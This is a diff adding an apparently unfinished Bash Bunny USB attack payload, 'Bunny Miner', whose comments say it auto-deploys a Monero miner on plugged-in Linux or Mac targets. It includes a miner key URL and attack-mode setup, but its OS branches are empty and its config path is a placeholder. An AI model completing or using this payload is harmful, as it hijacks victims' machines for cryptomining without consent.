@@ -1,0 +1,37 @@
+#!/bin/bash
+#
+# Title:         Bunny Miner 
+# Author:        sp1d3rJ -- Cred: Hak5Darren
+# Version:       1.0
+# Firmware:      >= 1.5
+#
+# miner address: https://authedmine.com/media/miner.html?key=gUOV6t2d6P8jKjMt6qb5A7SjXFjpUBv0
+#
+# Auto Deploy xmr-stak monero miner using provided config file
+#Target OS : linux / mac
+
+#options
+LOGDIR=/root/udisk/loot/minerlogs
+MINERCONFIG=/root/udisk...{Directory to config file}
+
+####### SETUP #######
+LED SETUP
+ATTACKMODE AUTO_ETHERNET HID
+
+####### ATTACK #######
+LED ATTACK
+
+GET TARGET_OS
+case "$TARGET_OS" in
+    WINDOWS)
+    #### Fail if plugged in to windows machine ####
+        LED FAIL
+        ;;
+    MACOS)
+
+        ;;
+    LINUX)
+##### BELOW WILL RUN ON LINUX ######
+        LED YELLOW
+        ;;
+esac
